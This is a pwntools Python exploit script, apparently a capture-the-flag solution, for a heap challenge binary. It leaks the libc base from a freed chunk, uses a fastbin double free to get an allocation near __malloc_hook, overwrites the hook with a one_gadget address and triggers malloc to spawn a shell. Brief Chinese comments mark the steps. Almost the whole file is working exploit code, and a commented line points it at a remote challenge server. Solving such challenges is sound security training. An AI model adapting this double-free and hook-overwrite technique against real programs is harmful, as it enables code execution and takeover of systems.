from pwn import *

io = process("./heap")
# io = remote("node4.anna.nssctf.cn", 20950)
libc = ELF("./libc.so.6")


def select(idx: int):
    io.recvuntil(b">>")
    io.sendline(str(idx).encode())


def create(idx: int, size: int):
    select(1)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"size? ")
    io.sendline(str(size).encode())


def delete(idx: int):
    select(2)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())


def show(idx: int):
    select(3)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())


def edit(idx: int, content: bytes):
    select(4)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"content : ")
    io.sendline(content)


create(0, 0xFF)
create(1, 0x10)  # 顶住 top chunk
delete(0)
show(0)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x3C4B78
malloc_hook_addr = libc_base + libc.sym["__malloc_hook"]
one_gadget = libc_base + 0xF1247
print("libc_base=", hex(libc_base))
print("malloc_hook=", hex(malloc_hook_addr))
create(2, 0x60)
create(3, 0x60)
delete(2)
delete(3)
delete(2)  # fastbin double free
edit(2, p64(malloc_hook_addr - 0x23))  # malloc_hook - 0x23 可以凑 0x7f 的头
create(4, 0x60)
create(5, 0x60)
edit(5, b"a" * (0x13) + p64(one_gadget))
create(6, 0xDEADBEAF)

io.interactive()
